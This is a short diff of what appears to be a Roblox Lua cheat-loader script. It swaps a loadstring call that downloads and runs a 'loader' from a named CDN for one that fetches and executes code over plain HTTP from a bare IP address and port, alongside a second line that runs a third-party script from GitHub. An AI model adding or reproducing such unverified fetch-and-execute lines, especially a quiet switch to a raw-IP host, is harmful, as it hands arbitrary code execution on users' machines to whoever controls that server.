@@ -144,7 +144,7 @@ task.delay(7.5, function()
                 msg2:Destroy()
                 -- Execute your custom loader first
                 ID="933a7800-ba26-4768-889c-6db85044f14c";
-                loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+                loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
                 -- Then execute the 3in1 script
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/3in1/main/3in1"))()
             end)
